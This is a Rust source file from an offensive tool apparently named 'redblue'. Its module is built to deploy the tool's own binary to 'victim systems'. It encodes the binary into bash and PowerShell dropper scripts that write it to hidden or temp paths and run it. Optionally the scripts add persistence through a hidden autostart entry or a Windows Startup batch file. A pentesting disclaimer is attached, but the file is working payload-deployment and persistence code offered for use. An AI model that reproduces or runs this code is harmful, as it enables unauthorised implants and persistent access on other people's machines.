/// Self-replication module for deploying redblue binary to victim systems
///
/// This module extracts the current rb binary, encodes it, and generates
/// deployment scripts for Linux, Windows, and MacOS targets.
///
/// ⚠️ AUTHORIZED USE ONLY - For pentesting, CTFs, and authorized security research
use std::env;
use std::fs;
use std::io::Read;
use std::path::PathBuf;

/// Self-replicator to deploy rb binary to victims
pub struct SelfReplicator {
    /// Path to current binary (auto-detected)
    binary_path: PathBuf,
    /// Base64-encoded binary payload
    encoded_payload: Option<String>,
    /// Target OS (linux, windows, macos)
    target_os: String,
    /// Enable persistence mechanisms
    persistence: bool,
}

impl SelfReplicator {
    /// Create new self-replicator (auto-detects current binary)
    pub fn new() -> Result<Self, String> {
        let binary_path =
            env::current_exe().map_err(|e| format!("Failed to get current binary path: {}", e))?;

        Ok(Self {
            binary_path,
            encoded_payload: None,
            target_os: "linux".to_string(),
            persistence: false,
        })
    }

    /// Set target OS (linux, windows, macos)
    pub fn with_os(mut self, os: &str) -> Self {
        self.target_os = os.to_lowercase();
        self
    }

    /// Enable persistence mechanisms
    pub fn with_persistence(mut self, enable: bool) -> Self {
        self.persistence = enable;
        self
    }

    /// Extract and encode the current binary as base64
    pub fn extract_binary(&mut self) -> Result<(), String> {
        // Read binary file
        let mut file = fs::File::open(&self.binary_path)
            .map_err(|e| format!("Failed to open binary: {}", e))?;

        let mut buffer = Vec::new();
        file.read_to_end(&mut buffer)
            .map_err(|e| format!("Failed to read binary: {}", e))?;

        // Base64 encode (using our crypto module)
        use crate::crypto::encode_base64;
        self.encoded_payload = Some(encode_base64(&buffer));

        Ok(())
    }

    /// Generate deployment script for target OS
    pub fn generate_script(&self) -> Result<String, String> {
        let payload = self
            .encoded_payload
            .as_ref()
            .ok_or("Binary not extracted. Call extract_binary() first")?;

        match self.target_os.as_str() {
            "linux" | "macos" => self.generate_bash_script(payload),
            "windows" => self.generate_powershell_script(payload),
            _ => Err(format!("Unsupported OS: {}", self.target_os)),
        }
    }

    /// Generate bash deployment script (Linux/MacOS)
    fn generate_bash_script(&self, payload: &str) -> Result<String, String> {
        let mut script = String::new();

        script.push_str("#!/bin/bash\n");
        script.push_str("# redblue self-replication deployment script\n");
        script.push_str("# ⚠️ AUTHORIZED USE ONLY\n\n");

        script.push_str("set -e\n\n");

        // Base64 payload (chunked for readability)
        script.push_str("# Base64-encoded redblue binary\n");
        script.push_str("PAYLOAD=\"");
        script.push_str(payload);
        script.push_str("\"\n\n");

        // Decode and deploy
        script.push_str("# Deploy binary\n");
        script.push_str("echo \"[+] Deploying redblue binary...\"\n");
        script.push_str("echo \"$PAYLOAD\" | base64 -d > /tmp/.rb\n");
        script.push_str("chmod +x /tmp/.rb\n");
        script.push_str("echo \"[+] Binary deployed to /tmp/.rb\"\n\n");

        // Persistence (optional)
        if self.persistence {
            script.push_str("# Enable persistence\n");
            script.push_str("echo \"[+] Installing persistence...\"\n");
            script.push_str("cp /tmp/.rb ~/.local/bin/rb 2>/dev/null || true\n");
            script.push_str("mkdir -p ~/.config/autostart 2>/dev/null || true\n");
            script.push_str("cat > ~/.config/autostart/rb.desktop <<'EOF'\n");
            script.push_str("[Desktop Entry]\n");
            script.push_str("Type=Application\n");
            script.push_str("Name=redblue\n");
            script.push_str("Exec=$HOME/.local/bin/rb repl\n");
            script.push_str("Hidden=true\n");
            script.push_str("EOF\n");
            script.push_str("echo \"[+] Persistence installed\"\n\n");
        }

        // Execute
        script.push_str("# Execute redblue\n");
        script.push_str("echo \"[+] Launching redblue...\"\n");
        script.push_str("/tmp/.rb --version\n");
        script.push_str("echo \"[+] Deployment complete!\"\n");

        Ok(script)
    }

    /// Generate PowerShell deployment script (Windows)
    fn generate_powershell_script(&self, payload: &str) -> Result<String, String> {
        let mut script = String::new();

        script.push_str("# redblue self-replication deployment script (PowerShell)\n");
        script.push_str("# ⚠️ AUTHORIZED USE ONLY\n\n");

        script.push_str("$ErrorActionPreference = \"Stop\"\n\n");

        // Base64 payload
        script.push_str("# Base64-encoded redblue binary\n");
        script.push_str("$payload = @\"\n");
        script.push_str(payload);
        script.push_str("\n\"@\n\n");

        // Decode and deploy
        script.push_str("# Deploy binary\n");
        script.push_str("Write-Host \"[+] Deploying redblue binary...\"\n");
        script.push_str("$bytes = [System.Convert]::FromBase64String($payload)\n");
        script.push_str("$targetPath = \"$env:TEMP\\rb.exe\"\n");
        script.push_str("[System.IO.File]::WriteAllBytes($targetPath, $bytes)\n");
        script.push_str("Write-Host \"[+] Binary deployed to $targetPath\"\n\n");

        // Persistence (optional)
        if self.persistence {
            script.push_str("# Enable persistence\n");
            script.push_str("Write-Host \"[+] Installing persistence...\"\n");
            script.push_str("$startupPath = \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\rb.bat\"\n");
            script.push_str(
                "Set-Content -Path $startupPath -Value \"@echo off`nstart /b $targetPath repl\"\n",
            );
            script.push_str("Write-Host \"[+] Persistence installed\"\n\n");
        }

        // Execute
        script.push_str("# Execute redblue\n");
        script.push_str("Write-Host \"[+] Launching redblue...\"\n");
        script.push_str("& $targetPath --version\n");
        script.push_str("Write-Host \"[+] Deployment complete!\"\n");

        Ok(script)
    }

    /// Get binary size in bytes
    pub fn binary_size(&self) -> Result<u64, String> {
        let metadata = fs::metadata(&self.binary_path)
            .map_err(|e| format!("Failed to get binary metadata: {}", e))?;
        Ok(metadata.len())
    }

    /// Get binary path
    pub fn binary_path(&self) -> &PathBuf {
        &self.binary_path
    }

    /// Save deployment script to file
    pub fn save_script(&self, output_path: &str) -> Result<(), String> {
        let script = self.generate_script()?;

        fs::write(output_path, script).map_err(|e| format!("Failed to write script: {}", e))?;

        // Make executable on Unix
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = fs::metadata(output_path)
                .map_err(|e| format!("Failed to get file metadata: {}", e))?
                .permissions();
            perms.set_mode(0o755);
            fs::set_permissions(output_path, perms)
                .map_err(|e| format!("Failed to set permissions: {}", e))?;
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_replicator_creation() {
        let replicator = SelfReplicator::new();
        assert!(replicator.is_ok());
    }

    #[test]
    fn test_os_targeting() {
        let replicator = SelfReplicator::new()
            .unwrap()
            .with_os("windows")
            .with_persistence(true);

        assert_eq!(replicator.target_os, "windows");
        assert!(replicator.persistence);
    }

    #[test]
    fn test_binary_size() {
        let replicator = SelfReplicator::new().unwrap();
        let size = replicator.binary_size();
        assert!(size.is_ok());
        assert!(size.unwrap() > 0);
    }
}
